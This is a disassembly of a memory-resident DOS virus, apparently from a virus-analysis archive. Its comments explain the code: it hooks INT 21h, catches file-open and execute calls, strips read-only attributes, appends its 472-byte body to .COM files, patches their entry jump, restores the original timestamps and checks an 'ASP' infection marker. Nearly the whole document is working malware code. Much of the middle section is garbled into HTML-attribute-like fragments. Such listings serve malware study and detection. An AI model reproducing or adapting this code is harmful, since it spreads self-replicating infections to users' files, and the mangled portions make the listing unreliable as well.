

seg_a	segment	byte public
	assume	cs:seg_a, ds:seg_a


	org	100h

start:	jmp	l_93BC						;0100  E9 92B9

;====================
;	VICTIM CODE FOLLOW HERE
;--------------------
	org	93B5h

;===============================================================
;		virus part begin
;---------------------------------------------------------------
d_93B5	db	0AAh,000h,022h,022h,022h,022h,022h	;7 bytes of garbage

;===============
;	<--- virus="" entry="" point="" ;---------------="" l_93bc:="" pushf="" ;93bc="" 9c="" push="" ax="" ;93bd="" 50="" push="" bx="" ;93be="" 53="" push="" cx="" ;93bf="" 51="" push="" dx="" ;93c0="" 52="" push="" si="" ;93c1="" 56="" push="" di="" ;93c2="" 57="" push="" ds="" ;93c3="" 1e="" push="" es="" ;93c4="" 06="" call="" s_93c8="" ;establish="" addressability="" ;93c5="" e8="" 0000="" s_93c8:="" pop="" dx="" ;93c8="" 5a="" mov="" si,9000h="" ;resident="" virus="" segment="" ;93c9="" be="" 9000="" mov="" es,si="" ;93cc="" 8e="" c6="" mov="" cx,es:[9000h]="" ;allready="" resident="" ;93ce="" 26:="" 8b="" 0e="" 9000="" cmp="" cx,0fc80h="" ;93d3="" 81="" f9="" fc80="" jne="" l_93dc="" ;-=""> not				;93D7  75 03
	jmp	short l_9433	;-> virus resident		;93D9  EB 58
	nop							;93DB  90

l_93DC:	cli			;<--- get="" int="" 21h="" ;93dc="" fa="" mov="" si,93h="" ;93dd="" .be="" 0093="" add="" si,dx="" ;+="" relacation="offset" d_945b="" ;93e0="" 01="" d6="" xor="" bx,bx="" ;93e2="" 31="" db="" mov="" es,bx="" ;93e4="" 8e="" c3="" mov="" bx,84h="" ;int="" 21h="" offset="" ;93e6="" .bb="" 0084="" mov="" cx,es:[bx]="" ;93e9="" 26:="" 8b="" 0f="" mov="" [si],cx="" ;save="" oryginal="" int="" 21h="" vector="" ;93ec="" 89="" 0c="" inc="" si="" ;93ee="" 46="" inc="" si="" ;93ef="" 46="" inc="" bx="" ;93f0="" 43="" inc="" bx="" ;93f1="" 43="" mov="" cx,es:[bx]="" ;93f2="" 26:="" 8b="" 0f="" mov="" [si],cx="" ;93f5="" 89="" 0c="" mov="" si,1beh="" ;93f7="" .be="" 01be="" add="" si,dx="" ;+="" relocation="offset" d_9586="" ;93fa="" 01="" d6="" xor="" bx,bx="" ;93fc="" 31="" db="" mov="" es,bx="" ;93fe="" 8e="" c3="" mov="" bx,84h="" ;int="" 21h="" vector="" address="" ;9400="" .bb="" 0084="" mov="" cx,es:[bx]="" ;get="" int="" 21h="" vector="" ;9403="" 26:="" 8b="" 0f="" mov="" [si],cx="" ;9406="" 89="" 0c="" mov="" word="" ptr="" es:[bx],9000h="" ;new="" int="" 21h="" offset="" ;9408="" 26:="" c7="" 07="" 9000="" inc="" si="" ;940d="" 46="" inc="" si="" ;940e="" 46="" inc="" bx="" ;940f="" 43="" inc="" bx="" ;9410="" 43="" mov="" cx,es:[bx]="" ;9411="" 26:="" 8b="" 0f="" mov="" [si],cx="" ;9414="" 89="" 0c="" mov="" word="" ptr="" es:[bx],9000h="" ;new="" int="" 21h="" segment="" ;9416="" 26:="" c7="" 07="" 9000=""></---><----- copy="" virus="" code="" mov="" si,dx="" ;="offset" l_93c8="" ;941b="" 8b="" f2="" sub="" si,0ch="" ;="offset" l_93bc="" ;941d="" 83="" ee="" 0c="" mov="" ax,9000h="" ;9420="" b8="" 9000="" mov="" es,ax="" ;9423="" 8e="" c0="" mov="" di,9000h="" ;9425="" .bf="" 9000="" mov="" ax,0aah="" ;to="" make="" l_9466="d_9000" ;9428="" b8="" 00aa="" sub="" di,ax="" ;942b="" 29="" c7="" mov="" cx,1d2h="" ;virus="" length="466" ;942d="" b9="" 01d2="" cld="" ;9430="" fc="" rep="" movsb="" ;9431="" f3/="" a4=""></-----><----- virus="" code="" resident="" l_9433:="" mov="" ax,cs=""></-----><- restore="" victim="" bytes="" ;9433="" 8c="" c8="" mov="" ds,ax="" ;9435="" 8e="" d8="" mov="" bx,98h="" ;saved="" bytes="" address="" ;9437="" .bb="" 0098="" add="" bx,dx="" ;="" +="" relocation="offset" d_9460="" ;943a="" 01="" d3="" mov="" cx,[bx]="" ;943c="" 8b="" 0f="" mov="" word="" ptr="" ds:[100h],cx="" ;943e="" 89="" 0e="" 0100="" inc="" bx="" ;9442="" 43="" inc="" bx="" ;9443="" 43="" mov="" cl,[bx]="" ;9444="" 8a="" 0f="" mov="" byte="" ptr="" ds:[102h],cl="" ;9446="" 88="" 0e="" 0102="" pop="" es=""></-><- restore="" registers="" ;944a="" 07="" pop="" ds="" ;944b="" 1f="" pop="" di="" ;944c="" 5f="" pop="" si="" ;944d="" 5e="" pop="" dx="" ;944e="" 5a="" pop="" cx="" ;944f="" 59="" pop="" bx="" ;9450="" 5b="" pop="" ax="" ;9451="" 58="" sti="" ;9452="" fb="" popf="" ;9453="" 9d="" mov="" bx,100h="" ;victim="" entry="" point="" ;9454="" .bb="" 0100="" jmp="" bx="" ;9457="" ff="" e3="" ;="==============================================================" ;="" call="" oryginal="" int="" 21h="" service="" ;---------------------------------------------------------------="" s_9459="" proc="" near="" pushf="" ;9459="" 9c="" ;call="" far="" ptr="" 02c7:1716="" db="" 9ah="" ;945a="" 9a="" d_935b="" dw="" 1716h,02c7h="" ;945b="" 16="" 17="" c7="" 02="" retn="" ;945f="" c3="" s_9459="" endp="" ;------------="" ;="" saved="" victim="" bytes/disk="" buffer="" ;------------="" d_9460="" db="" 0e9h,01dh,01ah="" ;9460="" e9="" 1d="" 1a="" ;------------="" ;="" jmp="" into="" viru="" pattern="" ;------------="" d_9463="" db="" 0e9h,0b9h,92h="" ;9463="" e9="" b9="" 92="" ;="==============================================================" ;="" new="" int="" 21h="" service="" ;---------------------------------------------------------------="" l_9466:="" cmp="" ah,3dh="" ;open="" a="" file="" ;9466="" 80="" fc="" 3d="" je="" l_9473="" ;-=""> yes				;9469  74 08
	cmp	ah,4Bh		;Load or execute program ?	;946B  80 FC 4B
	je	l_9473		;-> yes				;946E  74 03
	jmp	l_9585		;-> not interesting for virus	;9470  E9 0112

;------------------
;	Open a File/Load or Execute
;------------------
l_9473:	push	ax						;9473  50
	push	bx						;9474  53
	push	cx						;9475  51
	push	dx						;9476  52
	push	si						;9477  56
	push	bp						;9478  55
	push	ds						;9479  1E
	push	es						;947A  06
	call	s_947E		;establish addressability	;947B  E8 0000
s_947E:	pop	bx						;947E  5B
	push	bx						;947F  53
	mov	si,dx		;file name address		;9480  8B F2
	mov	cx,40h		;max path length		;9482  B9 0040

l_9485:	db	3Eh			;DS: prefix		;9485 3E
	CMP     BYTE PTR [SI],'.'				;9486 80 3C 2E
	JZ      l_9492			;-> OK			;9489 74 07
	INC     SI			;<- it's="" not="" a="" com="" file="" ;948b="" 46="" loop="" l_9485="" ;948c="" e2="" f7=""></-><----- not="" infectable="" file="" l_948e:="" pop="" si="" ;948e="" 5e="" jmp="" l_957d="" ;948f="" e9="" 00eb="" l_9492:="" inc="" si="" ;9492="" 46="" db="" 3eh="" ;ds:="" prefix="" ;9493="" 3e="" cmp="" byte="" ptr="" [si],'c'="" ;9494="" 803c43="" jnz="" l_948e="" ;-=""> it's not a COM file	;9497 75F5
	INC     SI						;9499 46
	db	3Eh			;DS: prefix		;949A 3E
	CMP     BYTE PTR [SI],'O'				;949B 803C4F
	JNZ     l_948E			;-> it's not a COM file	;949E 75EE
	INC     SI						;94A0 46
	db	3Eh			;DS: prefix		;94A1 3E
	CMP     BYTE PTR [SI],'M'				;94A2 803C4D
	JNZ     l_948E		;-> it's not a COM file		;94A5 75E7

	MOV     AX,4300h	;Get file attribute		;94A7 B80043
	CALL    s_9459		;= call oryginal int 21h	;94AA E8ACFF
	SHR     CL,1						;94AD D0E9
	JAE     l_94BC		;-> not carry = no Read Only	;94AF 730B
	SHL     CL,1		;<- set="" r/o="" bit="0" ;94b1="" d0e1="" and="" cl,0feh="" ;94b3="" 80e1fe="" mov="" ax,4301h="" ;set="" file="" attribute="" ;94b6="" b80143="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;94b9="" e89dff="" l_94bc:="" mov="" ax,3d02h="" ;open="" file="" r/w="" ;94bc="" b8023d="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;94bf="" e897ff="" mov="" bp,ax="" ;file="" handle="" ;94c2="" 8be8="" mov="" ax,4202h="" ;move="" file="" ptr="" eof+offset="" ;94c4="" b80242="" mov="" bx,bp="" ;94c7="" 8bdd="" xor="" cx,cx="" ;94c9="" 31c9="" xor="" dx,dx="" ;94cb="" 31d2="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;94cd="" e889ff="" push="" ax="" ;94d0="" 50="" mov="" cx,dx="" ;hi="" order="" byte="" of="" file="" length="" ;94d1="" 8bca="" sub="" ax,3="" ;cantamination="" ptr="" offset="" ;94d3="" 2d0300="" mov="" dx,ax="" ;94d6="" 8bd0="" mov="" ax,4200h="" ;move="" file="" ptr="" bof+offset="" ;94d8="" b80042="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;94db="" e87bff="" pop="" ax="" ;file="" length="" ;94de="" 58="" pop="" dx="" ;virus="" base="" address="" ;94df="" 5a="" push="" ax="" ;94e0="" 50="" push="" dx="" ;94e1="" 52="" mov="" ax,001eh="" ;94e2="" b81e00="" sub="" dx,ax="" ;="offset" d_9460="" ;94e5="" 29c2="" push="" dx="" ;94e7="" 52="" mov="" ax,cs="" ;94e8="" 8cc8="" mov="" ds,ax="" ;94ea="" 8ed8="" mov="" cx,0003h="" ;contamination="" ptr="" length="" ;94ec="" b90300="" mov="" ah,3fh="" ;read="" handle="" ;94ef="" b43f="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;94f1="" e865ff="" pop="" di="" ;buffer="" offset="" ;94f4="" 5f="" pop="" ax="" ;virus="" base="" address="" ;94f5="" 58="" push="" ax="" ;94f6="" 50="" mov="" si,010ch="" ;94f7="" be0c01="" add="" si,ax="" ;+="" relacation="offset" d_958a="" ;94fa="" 01c6="" push="" ds="" ;94fc="" 1e="" pop="" es="" ;94fd="" 07="" mov="" cx,0003h="" ;94fe="" b90300="" l_9501:="" cmpsb="" ;9501="" a6="" jnz="" l_950f="" ;-=""> not contamined yet		;9502  75 0B
	loop	l_9501						;9504  E2 FB

	;<----- allready="" infected="" mov="" ah,3eh="" ;close="" handle="" ;9506="" b4="" 3e="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;9508="" e8="" ff4e="" pop="" si="" ;950b="" 5e="" jmp="" l_948e="" ;-=""> run oryginal int 21h service;950C  E9 FF7F

	;<----- file="" not="" infected,="" contamination="" l_950f:="" mov="" ax,5700h="" ;get="" file="" time="" &="" date="" ;950f="" b8="" 5700="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;9512="" e8="" ff44="" pop="" ax="" ;9515="" 58="" pop="" si="" ;9516="" 5e="" push="" cx="" ;file="" time="" ;9517="" 51="" push="" dx="" ;file="" date="" ;9518="" 52="" push="" si="" ;9519="" 56="" push="" ax="" ;951a="" 50="" mov="" ax,4200h="" ;move="" file="" ptr="" bof+offset="" ;951b="" b8="" 4200="" xor="" cx,cx="" ;951e="" 31="" c9="" xor="" dx,dx="" ;9520="" 31="" d2="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;9522="" e8="" ff34="" mov="" ax,1eh="" ;9525="" b8="" 001e="" pop="" dx="" ;virus="" base="" ;9528="" 5a="" push="" dx="" ;9529="" 52="" sub="" dx,ax="" ;dx="offset" d_9460="" ;952a="" 29="" c2="" mov="" cx,3="" ;bytes="" to="" read="" ;952c="" b9="" 0003="" mov="" ah,3fh="" ;read="" handle="" ;952f="" b4="" 3f="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;9531="" e8="" ff25="" pop="" dx="" ;virus="" base="" ;9534="" 5a="" pop="" ax="" ;file="" length="" ;9535="" 58="" push="" dx="" ;9536="" 52="" add="" ax,4="" ;add="" 4="" b="" between="" virus&victim="" ;9537="" 05="" 0004="" mov="" cx,1ah="" ;953a="" b9="" 001a="" mov="" si,dx="" ;953d="" 8b="" f2="" sub="" si,cx="" ;si="offset" d_9464="" ;953f="" 29="" ce="" mov="" [si],ax="" ;jmp="" distance="" ;9541="" 89="" 04="" mov="" ax,4200h="" ;move="" file="" ptr="" bof+offset="" ;9543="" b8="" 4200="" xor="" cx,cx="" ;9546="" 31="" c9="" xor="" dx,dx="" ;9548="" 31="" d2="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;954a="" e8="" ff0c="" mov="" cx,3="" ;jmp="" length="" ;954d="" b9="" 0003="" mov="" dx,si="" ;9550="" 8b="" d6="" dec="" dx="" ;dx="offset" d_9463="" ;9552="" 4a="" mov="" ah,40h="" ;write="" handle="" ;9553="" b4="" 40="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;9555="" e8="" ff01="" xor="" cx,cx="" ;9558="" 31="" c9="" xor="" dx,dx="" ;955a="" 31="" d2="" mov="" ax,4202h="" ;move="" file="" ptr="" eof+offset="" ;955c="" b8="" 4202="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;955f="" e8="" fef7="" pop="" dx="" ;9562="" 5a="" mov="" ax,0c9h="" ;9563="" b8="" 00c9="" sub="" dx,ax="" ;="offset" d_93b5="" ;9566="" 29="" c2="" mov="" cx,1d8h="" ;="472=virus" length+7="" ;9568="" b9="" 01d8="" mov="" ah,40h="" ;write="" handle="" ;956b="" b4="" 40="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;956d="" e8="" fee9="" pop="" dx="" ;oryginal="" file="" date="" ;9570="" 5a="" pop="" cx="" ;oryginal="" file="" time="" ;9571="" 59="" mov="" ax,5701h="" ;set="" file="" date/time="" ;9572="" b8="" 5701="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;9575="" e8="" fee1="" mov="" ah,3eh="" ;close="" handle="" ;9578="" b4="" 3e="" call="" s_9459="" ;="call" oryginal="" int="" 21h="" ;957a="" e8="" fedc=""></-----><----- not="" infectable="" file/end="" of="" contamination="" l_957d:="" pop="" es="" ;957d="" 07="" pop="" ds="" ;957e="" 1f="" pop="" bp="" ;957f="" 5d="" pop="" si="" ;9580="" 5e="" pop="" dx="" ;9581="" 5a="" pop="" cx="" ;9582="" 59="" pop="" bx="" ;9583="" 5b="" pop="" ax="" ;9584="" 58="" l_9585:="" db="" 0eah="" ;jmp="" far="" ptr="" 02c7:1716="" ;9585="" ea="" d_9586="" dw="" 1716h,02c7h="" ;oryginal="" dos="" entry="" ;9586="" 16="" 17="" c7="" 02="" d_958a="" db="" 'asp'="" ;contamination="" ptr="" ;958a="" 41="" 53="" 50="" seg_a="" ends="" end="" start="" =""></-----></-----></-></-----></-></--->